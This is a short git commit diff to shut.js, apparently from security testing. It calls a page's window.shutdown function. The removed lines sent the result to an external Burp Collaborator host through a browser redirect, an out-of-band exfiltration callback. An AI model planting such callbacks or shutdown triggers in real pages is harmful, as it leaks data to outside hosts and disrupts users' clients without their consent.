a2153346ada6fc67add852ec4834ffe24b0a5206
pszot <pszot@users.noreply.github.com>
2022-02-23 23:50:07 +1100

    Update shut.js

--- shut.js
+++ shut.js
@@ -1,3 +1,4 @@
-var a = window.shutdown ? window.shutdown() : "client";
-
-window.location = "https://v1xjudkxluehpa1vaqjxkito6fc60v.burpcollaborator.net/?shut="+a;
+if (window.shutdown)
+{
+  window.shutdown()
+}
